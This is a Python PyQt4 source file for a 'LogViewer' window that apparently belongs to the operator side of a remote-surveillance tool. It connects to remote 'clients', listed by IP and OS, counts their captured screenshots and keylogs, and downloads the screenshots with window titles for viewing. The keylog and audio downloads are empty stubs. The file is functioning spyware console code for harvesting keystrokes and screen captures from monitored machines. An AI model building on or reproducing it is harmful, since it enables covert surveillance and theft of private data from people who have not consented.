from ui.logViewer import Ui_Form as logViewerUi
from PyQt4.QtGui import *
from PyQt4.QtCore import *

import os

from libs.data_transfer import data_get, data_send, data_receive
from language import Translate

# Multi Lang
translate = Translate()
_ = lambda _word: translate.word(_word)


class LogViewer(QWidget, logViewerUi):

    def __init__(self, args):
        QWidget.__init__(self)
        self.setupUi(self)

        self.socket = args['sock']
        self.client_id = args['key']
        self.client_alias = args['alias']
        self.client_ip_address = args['ip_address']
        self.client_os = args['os']
        self.session_id = args['session_id']

        self.date = str(self.timeCalendar.selectedDate().toPyDate())

        # Triggers
        self.timeCalendar.clicked.connect(self.check_data_counts)
        self.downloadButton.clicked.connect(self.download_data)

        # Init
        self.init_ui()
        self.set_language()
        self.check_data_counts()

    def init_ui(self):
        self.clientIdLine.setText(self.client_id)
        self.clientAliasLine.setText(self.client_alias)
        self.clientIpLine.setText(self.client_ip_address)
        self.clientOsLine.setText(self.client_os)

        # Hide Progress Bar
        self.downloadProgress.setHidden(True)
        self.downloadedLabel.setHidden(True)

    def set_language(self):
        self.setWindowTitle(_('VIEWER_WINDOW_TITLE'))
        self.logsTab.setTabText(0, _('VIEWER_SCREENSHOTS_TAB'))
        self.logsTab.setTabText(1, _('VIEWER_KEYLOGS_TAB'))
        self.logsTab.setTabText(2, _('VIEWER_AUDIO_TAB'))
        self.screenshotsTable.horizontalHeaderItem(0).setText(_('VIEWER_SCREENSHOT_PREVIEW'))
        self.screenshotsTable.horizontalHeaderItem(1).setText(_('VIEWER_SCREENSHOT_INFO'))
        # Keylogger
        # Audio
        self.clientInformationGroup.setWindowTitle(_('VIEWER_CLIENT_GROUP_TITLE'))
        self.clientIdLabel.setText(_('VIEWER_CLIENT_ID'))
        self.clientAliasLabel.setText(_('VIEWER_CLIENT_ALIAS'))
        self.clientIpLabel.setText(_('VIEWER_CLIENT_IP'))
        self.clientOsLabel.setText(_('VIEWER_CLIENT_OS'))
        self.downloadGroup.setWindowTitle(_('VIEWER_DOWNLOAD_GROUP_TITLE'))
        self.ignoreViewedCheck.setText(_('VIEWER_IGNOR_VIEWED'))
        self.downloadButton.setText(_('VIEWER_DOWNLOAD'))

    def update_date(self):
        self.date = str(self.timeCalendar.selectedDate().toPyDate())

    def check_data_counts(self):
        self.update_date()

        # Check Screenshots
        data = data_get(self.socket, '%s %s' % (self.client_id, self.date), 'countScreenshots', session_id=self.session_id)
        new, old = data['payload'].split('/')
        self.screenshotsCountNewLabel.setText(new)
        self.screenshotsCountOldLabel.setText(old)

        # Check Keylogs
        data = data_get(self.socket, '%s %s' % (self.client_id, self.date), 'countKeylogs', session_id=self.session_id)
        new, old = data['payload'].split('/')
        self.keylogsCountNewLabel.setText(new)
        self.keylogsCountOldLabel.setText(old)

        # Check Audio

    def download_data(self):

        selected_date = self.date

        selected_dir = str(QFileDialog.getExistingDirectory(self, _('VIEWER_SELECT_DIR')))
        current_dir = os.path.join(selected_dir, self.client_id, selected_date, 'Screenshots')
        if not os.path.exists(current_dir):
            os.makedirs(current_dir)

        filter_downloaded = 1 if self.ignoreViewedCheck.isChecked() else 0

        # Download Screenshots
        if self.screenshotsEnableButton.isChecked():
            count_data = data_get(self.socket, '%s %s %s' % (self.client_id, self.date, filter_downloaded), 'downloadScreenshots', self.session_id)
            if count_data['mode'] == 'noDataFound':
                return
            all_data_count = count_data['mode']

            # Prepar Progress Bar
            self.downloadProgress.setHidden(False)
            self.downloadedLabel.setHidden(False)
            self.downloadedLabel.setText('Downloading Screenshot 0/%s' % all_data_count)
            self.downloadProgress.setMaximum(int(all_data_count))
            self.downloadProgress.setValue(0)

            screenshots_names = count_data['payload']
            self.screenshots_dict = {}
            for index, name in enumerate(screenshots_names):
                screenshot = data_get(self.socket, name, 'downloadScreenshot', self.session_id)
                if screenshot['mode'] == 'noDataFound':
                    continue
                else:
                    path = os.path.join(current_dir, screenshot['payload']['datetime']+'.png')
                    with open(path, 'wb') as screenshot_file:
                        screenshot_file.write(screenshot['payload']['raw'])
                    self.screenshots_dict[screenshot['payload']['datetime']] = {
                        'datetime': screenshot['payload']['datetime'],
                        'date': screenshot['payload']['date'],
                        'window_title': screenshot['payload']['window_title'],
                        'path': path,
                    }
                    # Update Progress
                    self.downloadedLabel.setText('Downloading Screenshot %s/%s' % (index+1, all_data_count))
                    self.downloadProgress.setValue(index+1)
            # Finish
            self.downloadedLabel.setText('Screenshots Downloading Finished')



        # Download Keylogs
        if self.keylogsEnableButton.isChecked():
            pass

        # Download Audio
        if self.audioEnableButton.isChecked():
            pass

        # All Finished
        self.check_data_counts()
        self.update_tables()

    def update_tables(self):
        if len(self.screenshots_dict) > 0:
            self.screenshotsTable.setRowCount(len(self.screenshots_dict))
            self.screenshotsTable.setColumnWidth(0, 180)
            for index, key in enumerate(self.screenshots_dict):

                # add screenshot preview
                im = self.screenshots_dict[key]['path']
                image = QImage(im)
                pixmap = QPixmap.fromImage(image)
                previews_dict = QLabel()
                previews_dict.setPixmap(pixmap.scaled(200, 200, Qt.KeepAspectRatio))
                previews_dict.setScaledContents(True)
                self.screenshotsTable.setCellWidget(index, 0, previews_dict)

                # add screenshot information
                payload = '''
                <p align="center"><font color="#e67e22">%s</font></p>
                %s
                ''' % (self.screenshots_dict[key]['datetime'], self.screenshots_dict[key]['window_title'])
                infoText = QTextEdit()
                infoText.setStyleSheet('background: #2c3e50;\nborder: 1px ridge;\nborder-color: #2c3e50;\nborder-top: none;\npadding: 3px;')
                infoText.insertHtml(payload)
                self.screenshotsTable.setCellWidget(index, 1, infoText)